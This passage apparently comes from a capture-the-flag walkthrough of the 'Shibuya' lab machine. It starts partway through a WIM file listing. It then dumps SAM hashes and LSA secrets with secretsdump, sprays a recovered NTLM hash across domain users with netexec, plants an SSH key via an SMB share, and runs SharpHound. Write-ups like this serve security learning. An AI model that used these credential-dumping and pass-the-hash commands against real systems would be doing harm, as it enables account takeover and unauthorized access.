2025-02-16 11:01:06 ....A        81888        17163  EFI/sr-Latn-RS/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81928        17173  EFI/sr-Latn-RS/bootmgr.efi.mui
2025-02-16 11:01:06 ....A        80864        16457  EFI/sv-SE/bootmgfw.efi.mui
2025-02-16 11:01:06 ....A        80904        16471  EFI/sv-SE/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        44872        12688  EFI/sv-SE/memtest.efi.mui
2025-02-16 11:01:06 ....A        80368        16577  EFI/tr-TR/bootmgfw.efi.mui
2021-05-08 08:14:34 ....A        45384        12752  EFI/tr-TR/memtest.efi.mui
2025-02-16 11:01:06 ....A        80392        16564  EFI/tr-TR/bootmgr.efi.mui
2025-02-16 11:01:06 ....A        81928        17296  EFI/uk-UA/bootmgfw.efi.mui
2025-02-16 11:01:06 ....A        81912        17296  EFI/uk-UA/bootmgr.efi.mui
2025-02-16 11:01:06 ....A        66056        14880  EFI/zh-CN/bootmgfw.efi.mui
2025-02-16 11:01:06 ....A        66040        14884  EFI/zh-CN/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        42312        12302  EFI/zh-CN/memtest.efi.mui
2025-02-16 11:01:06 ....A        66032        14952  EFI/zh-TW/bootmgr.efi.mui
2025-02-16 11:01:06 ....A        66056        14945  EFI/zh-TW/bootmgfw.efi.mui
2021-05-08 08:14:34 ....A        42312        12317  EFI/zh-TW/memtest.efi.mui
2025-02-16 11:00:54 ....A      2774808      1544372  EFI_EX/bootmgfw_EX.efi
2025-02-16 11:01:07 ....A        94624        18380  EFI_EX/bg-BG/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17641  EFI_EX/bg-BG/bootmgr_EX.efi.mui
2025-02-16 11:00:54 ....A      2758048      1542671  EFI_EX/bootmgr_EX.efi
2025-02-16 11:01:07 ....A        93504        18368  EFI_EX/cs-CZ/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90016        17665  EFI_EX/cs-CZ/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        92600        17946  EFI_EX/da-DK/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90008        17657  EFI_EX/da-DK/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        97200        18658  EFI_EX/de-DE/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89984        17631  EFI_EX/de-DE/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        97712        19370  EFI_EX/el-GR/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17657  EFI_EX/el-GR/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        89920        17518  EFI_EX/en-GB/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90016        17661  EFI_EX/en-GB/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        89920        17514  EFI_EX/en-US/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89920        17513  EFI_EX/en-US/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94512        17932  EFI_EX/es-ES/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17653  EFI_EX/es-ES/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94528        17915  EFI_EX/es-MX/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90016        17663  EFI_EX/es-MX/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        91080        17825  EFI_EX/et-EE/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17645  EFI_EX/et-EE/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        93488        17819  EFI_EX/fi-FI/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17645  EFI_EX/fi-FI/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        96712        18543  EFI_EX/fr-CA/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17651  EFI_EX/fr-CA/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        96672        18511  EFI_EX/fr-FR/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17653  EFI_EX/fr-FR/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        93600        18313  EFI_EX/hr-HR/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17651  EFI_EX/hr-HR/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        96672        18719  EFI_EX/hu-HU/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17649  EFI_EX/hu-HU/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94008        17869  EFI_EX/it-IT/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90016        17655  EFI_EX/it-IT/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        81328        17091  EFI_EX/ja-JP/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90016        17657  EFI_EX/ja-JP/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        80704        16697  EFI_EX/ko-KR/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90000        17658  EFI_EX/ko-KR/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        92480        18123  EFI_EX/lt-LT/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89984        17635  EFI_EX/lt-LT/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        91960        17969  EFI_EX/lv-LV/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89984        17631  EFI_EX/lv-LV/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        92064        17827  EFI_EX/nb-NO/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17655  EFI_EX/nb-NO/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94624        18147  EFI_EX/nl-NL/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89984        17629  EFI_EX/nl-NL/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        95552        18322  EFI_EX/pl-PL/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89984        17639  EFI_EX/pl-PL/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        93504        17856  EFI_EX/pt-BR/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17655  EFI_EX/pt-BR/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        93600        18013  EFI_EX/pt-PT/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17657  EFI_EX/pt-PT/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        93104        18201  EFI_EX/ro-RO/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        89984        17635  EFI_EX/ro-RO/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94112        18726  EFI_EX/ru-RU/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90016        17663  EFI_EX/ru-RU/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94016        18436  EFI_EX/sk-SK/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17655  EFI_EX/sk-SK/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        93088        18210  EFI_EX/sl-SI/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17641  EFI_EX/sl-SI/bootmgr_EX.efi.mui
2025-02-16 11:01:07 ....A        94128        18353  EFI_EX/sr-Latn-RS/bootmgfw_EX.efi.mui
2025-02-16 11:01:07 ....A        90024        17665  EFI_EX/sr-Latn-RS/bootmgr_EX.efi.mui
2025-02-16 11:01:06 ....A        93088        17897  EFI_EX/sv-SE/bootmgfw_EX.efi.mui
2025-02-16 11:01:06 ....A        90024        17649  EFI_EX/sv-SE/bootmgr_EX.efi.mui
2025-02-16 11:01:06 ....A        92592        17957  EFI_EX/tr-TR/bootmgfw_EX.efi.mui
2025-02-16 11:01:06 ....A        90000        17654  EFI_EX/tr-TR/bootmgr_EX.efi.mui
2025-02-16 11:01:06 ....A        90024        17647  EFI_EX/uk-UA/bootmgr_EX.efi.mui
2025-02-16 11:01:06 ....A        93640        18584  EFI_EX/uk-UA/bootmgfw_EX.efi.mui
2025-02-16 11:01:06 ....A        90024        17653  EFI_EX/zh-CN/bootmgr_EX.efi.mui
2025-02-16 11:01:06 ....A        76192        15876  EFI_EX/zh-CN/bootmgfw_EX.efi.mui
2025-02-16 11:01:06 ....A        90016        17655  EFI_EX/zh-TW/bootmgr_EX.efi.mui
2025-02-16 11:01:06 ....A        76592        15846  EFI_EX/zh-TW/bootmgfw_EX.efi.mui
2025-02-16 11:01:12 ....A      3696800      2544262  Fonts/chs_boot.ttf
2025-02-16 11:01:12 ....A      3879532      2648022  Fonts/cht_boot.ttf
2025-02-16 11:01:13 ....A      1986952      1288474  Fonts/jpn_boot.ttf
2025-02-16 11:01:13 ....A       194056       120833  Fonts/malgunn_boot.ttf
2025-02-16 11:01:13 ....A       196488       121367  Fonts/malgun_boot.ttf
2025-02-16 11:01:13 ....A      2374120      1098439  Fonts/kor_boot.ttf
2025-02-16 11:01:13 ....A       164328       102655  Fonts/meiryon_boot.ttf
2025-02-16 11:01:13 ....A       165980       103518  Fonts/meiryo_boot.ttf
2025-02-16 11:01:13 ....A       181584       118193  Fonts/msjhn_boot.ttf
2025-02-16 11:01:12 ....A       173616       111774  Fonts/msyhn_boot.ttf
2025-02-16 11:01:13 ....A       183564       118749  Fonts/msjh_boot.ttf
2025-02-16 11:01:12 ....A       175416       111335  Fonts/msyh_boot.ttf
2025-02-16 11:00:31 ....A        45980        30569  Fonts/segmono_boot.ttf
2025-02-16 11:00:31 ....A       102840        58857  Fonts/segoen_slboot.ttf
2025-02-16 11:00:31 ....A       103076        57972  Fonts/segoe_slboot.ttf
2025-02-16 11:00:31 ....A        50192        27449  Fonts/wgl4_boot.ttf
2025-02-16 11:01:12 ....A      3696644      2544094  Fonts_EX/chs_boot_EX.ttf
2025-02-16 11:01:13 ....A      3879448      2647971  Fonts_EX/cht_boot_EX.ttf
2025-02-16 11:01:13 ....A      1986792      1288304  Fonts_EX/jpn_boot_EX.ttf
2025-02-16 11:01:13 ....A       199456       125197  Fonts_EX/malgunn_boot_EX.ttf
2025-02-16 11:01:13 ....A       202000       125681  Fonts_EX/malgun_boot_EX.ttf
2025-02-16 11:01:13 ....A       174064       110126  Fonts_EX/meiryon_boot_EX.ttf
2025-02-16 11:01:13 ....A       176040       110703  Fonts_EX/meiryo_boot_EX.ttf
2025-02-16 11:01:13 ....A       199100       132103  Fonts_EX/msjhn_boot_EX.ttf
2025-02-16 11:01:13 ....A       201364       133144  Fonts_EX/msjh_boot_EX.ttf
2025-02-16 11:01:12 ....A       187832       122698  Fonts_EX/msyhn_boot_EX.ttf
2025-02-16 11:01:12 ....A       189844       122605  Fonts_EX/msyh_boot_EX.ttf
2025-02-16 11:00:31 ....A        45772        30389  Fonts_EX/segmono_boot_EX.ttf
2025-02-16 11:00:31 ....A       102752        58804  Fonts_EX/segoen_slboot_EX.ttf
2025-02-16 11:00:31 ....A       102916        57801  Fonts_EX/segoe_slboot_EX.ttf
2025-02-16 11:00:31 ....A        50016        27240  Fonts_EX/wgl4_boot_EX.ttf
2025-02-16 11:01:13 ....A      2374060      1098395  Fonts_EX/kor_boot_EX.ttf
2025-02-16 11:01:06 ....A       209416       131193  Misc/PCAT/bootspaces.dll
2021-05-08 08:14:33 ....A            1            1  PCAT/bootnxt
2025-02-16 11:01:06 ....A        29704        18631  PCAT/bootuwf.dll
2025-02-16 11:01:06 ....A       104456        60096  PCAT/bootvhd.dll
2025-02-16 11:01:06 ....A       440686       415946  PCAT/bootmgr
2025-02-16 11:01:34 ....A        82440        17367  PCAT/bg-BG/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        81400        17162  PCAT/cs-CZ/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12753  PCAT/cs-CZ/memtest.exe.mui
2025-02-16 11:01:34 ....A        80392        16543  PCAT/da-DK/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12690  PCAT/da-DK/memtest.exe.mui
2025-02-16 11:01:34 ....A        84464        17833  PCAT/de-DE/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45904        12779  PCAT/de-DE/memtest.exe.mui
2025-02-16 11:01:31 ....A      1057248       635339  PCAT/memtest.exe
2025-02-16 11:01:34 ....A        85512        18613  PCAT/el-GR/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        46416        13130  PCAT/el-GR/memtest.exe.mui
2025-02-16 11:01:34 ....A        78304        16078  PCAT/en-GB/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        44880        12447  PCAT/en-US/memtest.exe.mui
2025-02-16 11:01:34 ....A        78304        16085  PCAT/en-US/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45904        12790  PCAT/es-ES/memtest.exe.mui
2025-02-16 11:01:34 ....A        82416        17034  PCAT/es-ES/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        82440        16987  PCAT/es-MX/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        79368        16346  PCAT/et-EE/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        81416        16775  PCAT/fi-FI/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        84464        17755  PCAT/fr-CA/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12733  PCAT/fi-FI/memtest.exe.mui
2025-02-16 11:01:34 ....A        84488        17739  PCAT/fr-FR/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45904        12802  PCAT/fr-FR/memtest.exe.mui
2025-02-16 11:01:34 ....A        81392        17036  PCAT/hr-HR/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45904        12818  PCAT/hu-HU/memtest.exe.mui
2025-02-16 11:01:34 ....A        81912        16763  PCAT/it-IT/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12667  PCAT/it-IT/memtest.exe.mui
2025-02-16 11:01:34 ....A        84472        17979  PCAT/hu-HU/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        70664        16288  PCAT/ja-JP/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        42832        12442  PCAT/ja-JP/memtest.exe.mui
2025-02-16 11:01:34 ....A        70152        16259  PCAT/ko-KR/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        42832        12445  PCAT/ko-KR/memtest.exe.mui
2025-02-16 11:01:34 ....A        80352        16872  PCAT/lt-LT/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        80392        16694  PCAT/lv-LV/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        79864        16489  PCAT/nb-NO/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12710  PCAT/nb-NO/memtest.exe.mui
2025-02-16 11:01:34 ....A        82424        17060  PCAT/nl-NL/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12647  PCAT/nl-NL/memtest.exe.mui
2025-02-16 11:01:34 ....A        82952        17447  PCAT/pl-PL/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45904        12831  PCAT/pl-PL/memtest.exe.mui
2021-05-08 08:15:07 ....A        45392        12684  PCAT/pt-BR/memtest.exe.mui
2025-02-16 11:01:34 ....A        81392        16741  PCAT/pt-BR/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        81416        16803  PCAT/pt-PT/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45904        12728  PCAT/pt-PT/memtest.exe.mui
2021-05-08 08:15:07 ....A        54096        23765  PCAT/qps-ploc/memtest.exe.mui
2025-02-16 11:01:34 ....A        82400        16613  PCAT/qps-plocm/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        89072        28604  PCAT/qps-ploc/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        80904        16869  PCAT/ro-RO/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        81912        17472  PCAT/ru-RU/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        44880        12862  PCAT/ru-RU/memtest.exe.mui
2025-02-16 11:01:34 ....A        80904        16725  PCAT/sl-SI/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        81888        17157  PCAT/sr-Latn-RS/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        81928        17396  PCAT/sk-SK/bootmgr.exe.mui
2025-02-16 11:01:34 ....A        80904        16465  PCAT/sv-SE/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        44880        12664  PCAT/sv-SE/memtest.exe.mui
2025-02-16 11:01:34 ....A        80392        16562  PCAT/tr-TR/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        45392        12722  PCAT/tr-TR/memtest.exe.mui
2025-02-16 11:01:34 ....A        81912        17290  PCAT/uk-UA/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        42320        12280  PCAT/zh-CN/memtest.exe.mui
2025-02-16 11:01:34 ....A        66040        14878  PCAT/zh-CN/bootmgr.exe.mui
2021-05-08 08:15:07 ....A        42320        12287  PCAT/zh-TW/memtest.exe.mui
2025-02-16 11:01:34 ....A        66056        14939  PCAT/zh-TW/bootmgr.exe.mui
2021-05-08 09:34:41 ....A        12600         6878  Resources/en-US/bootres.dll.mui
2021-05-08 08:14:24 ....A       102712        87484  Resources/bootres.dll
------------------- ----- ------------ ------------  ------------------------
2025-02-16 11:05:50           72014980     32201982  295 files, 125 folders

```

### Find NTLM

#### Dump Hashes

I’ll use `7z` to extract the three hives. For example, `7z x AWSJPWK0222-02.wim SAM`. Now `secretsdump` in `local` mode will dump the hashes:

```

oxdf@hacky$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM 
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up...

```

#### Crack

Two of these hashes are the empty string (Guest and DefaultAccount). The other three are not known to [CrackStation](https://crackstation.net/):

![image-20250512184127822](/img/image-20250512184127822.png)

#### Spray

I’ve got 500 users and five NTLM hashes. Of the three non-empty passwords, the operator account is most likely to be reused, then Administrator, then WDAGUtilityAccount. I’ll start by spraying the operator hash, and it gets a hit:

```

oxdf@hacky$ netexec smb shibuya.vl -u users -H 5d8c3d1a20bd63f60f469f6763ca0d50 --continue-on-success
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\svc_autojoin:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Leon.Warren:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Graeme.Kerr:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Joshua.North:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Shaun.Burton:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Gillian.Douglas:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE
...[snip]...
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Keith.Wilson:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Joan.Taylor:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE       
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50                         
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Duncan.Roberts:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE  
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Hazel.Wright:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
...[snip]...

```

Trying this by itself works:

```

oxdf@hacky$ netexec smb shibuya.vl -u Simon.Watson -H 5d8c3d1a20bd63f60f469f6763ca0d50 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 

```

### SSH

#### Users Share

I can’t SSH directly with an NTLM hash. But I can connect to the `Users` share:

```

oxdf@hacky$ smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Feb 16 10:42:24 2025
  ..                                DHS        0  Wed Apr  9 00:09:45 2025
  Administrator                       D        0  Tue Apr  8 23:36:27 2025
  All Users                       DHSrn        0  Sat May  8 08:34:03 2021
  Default                           DHR        0  Sat Feb 15 15:49:13 2025
  Default User                    DHSrn        0  Sat May  8 08:34:03 2021
  desktop.ini                       AHS      174  Sat May  8 08:18:31 2021
  nigel.mills                         D        0  Tue Apr  8 23:30:42 2025
  Public                             DR        0  Sat Feb 15 06:49:31 2025
  simon.watson                        D        0  Tue Feb 18 19:36:45 2025

                5048575 blocks of size 4096. 1548067 blocks available

```

The flag is on the `simon.watson` user’s Desktop:

```

smb: \simon.watson\desktop\> ls
  .                                  DR        0  Wed Apr  9 00:06:32 2025
  ..                                  D        0  Mon May 12 23:00:44 2025
  user.txt                            A       32  Wed Apr  9 00:06:46 2025

                5048575 blocks of size 4096. 1548427 blocks available

```

I’ll create a `.ssh` directory:

```

smb: \simon.watson\> ls
  .                                   D        0  Tue Feb 18 19:36:45 2025
  ..                                 DR        0  Sun Feb 16 10:42:24 2025
  AppData                            DH        0  Sun Feb 16 10:42:06 2025
  Application Data                DHSrn        0  Sun Feb 16 10:42:06 2025
  Cookies                         DHSrn        0  Sun Feb 16 10:42:06 2025
  Desktop                            DR        0  Wed Apr  9 00:06:32 2025
  Documents                          DR        0  Sun Feb 16 10:42:06 2025
  Downloads                          DR        0  Sat May  8 08:20:24 2021
  Favorites                          DR        0  Sat May  8 08:20:24 2021
  Links                              DR        0  Sat May  8 08:20:24 2021
  Local Settings                  DHSrn        0  Sun Feb 16 10:42:06 2025
  Music                              DR        0  Sat May  8 08:20:24 2021
  My Documents                    DHSrn        0  Sun Feb 16 10:42:06 2025
  NetHood                         DHSrn        0  Sun Feb 16 10:42:06 2025
  NTUSER.DAT                        AHn   262144  Tue Apr  8 23:37:56 2025
  ntuser.dat.LOG1                   AHS        0  Sun Feb 16 10:42:06 2025
  ntuser.dat.LOG2                   AHS        0  Sun Feb 16 10:42:06 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf    AHS    65536  Sun Feb 16 10:42:08 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Feb 16 10:42:06 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Feb 16 10:42:06 2025
  ntuser.ini                         HS       20  Sun Feb 16 10:42:06 2025
  Pictures                           DR        0  Sat May  8 08:20:24 2021
  PrintHood                       DHSrn        0  Sun Feb 16 10:42:06 2025
  Recent                          DHSrn        0  Sun Feb 16 10:42:06 2025
  Saved Games                        Dn        0  Sat May  8 08:20:24 2021
  SendTo                          DHSrn        0  Sun Feb 16 10:42:06 2025
  Start Menu                      DHSrn        0  Sun Feb 16 10:42:06 2025
  Templates                       DHSrn        0  Sun Feb 16 10:42:06 2025
  Videos                             DR        0  Sat May  8 08:20:24 2021

                5048575 blocks of size 4096. 1548067 blocks available
smb: \simon.watson\> mkdir .ssh

```

Now I can put my public key into an `authorized_keys` file:

```

smb: \simon.watson\> put /home/oxdf/keys/ed25519_gen.pub .ssh\authorized_keys
putting file /home/oxdf/keys/ed25519_gen.pub as \simon.watson\.ssh\authorized_keys (0.3 kb/s) (average 0.3 kb/s

```

#### Connect

I’ll use that key to connect:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen simon.watson@shibuya.vl
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>

```

And grab `user.txt`:

```

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>type Desktop\user.txt
73531560************************

```

## Shell as nigel.mills

### Bloodhound

#### Collection

With a Shell on the box, I’ll have access to LDAP now. I’ll start the Bloodhound CE container, and go to the “Download Collectors page” to get the latest SharpHound:

![image-20250512205409872](/img/image-20250512205409872.png)

I’ll download it, and `scp` it to Shibuya:

```

oxdf@hacky$ scp -i ~/keys/ed25519_gen SharpHound.exe simon.watson@shibuya.vl:/programdata/
SharpHound.exe                       100% 1255KB   1.6MB/s   00:00

```

In the SSH session, I’ll run it, giving `-c all` to get all collection:

```

shibuya\simon.watson@AWSJPDC0522 C:\ProgramData>.\SharpHound.exe -c all
2025-05-12T18:10:03.2365739-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-05-12T18:10:03.4709451-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-05-12T18:10:03.5021978-07:00|INFORMATION|Initializing SharpHound at 6:10 PM on 5/12/2025
2025-05-12T18:10:03.5490697-07:00|INFORMATION|Resolved current domain to shibuya.vl
2025-05-12T18:10:04.0021966-07:00|INFORMATION|Loaded cache with stats: 19 ID to type mappings.
 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-05-12T18:10:04.0178213-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-05-12T18:10:04.1428215-07:00|INFORMATION|Beginning LDAP search for shibuya.vl
2025-05-12T18:10:04.3303218-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL
2025-05-12T18:10:04.3303218-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL
2025-05-12T18:10:04.3615711-07:00|INFORMATION|Beginning LDAP search for shibuya.vl Configuration NC
2025-05-12T18:10:04.5021973-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-05-12T18:10:04.5021973-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-05-12T18:10:04.5803208-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL
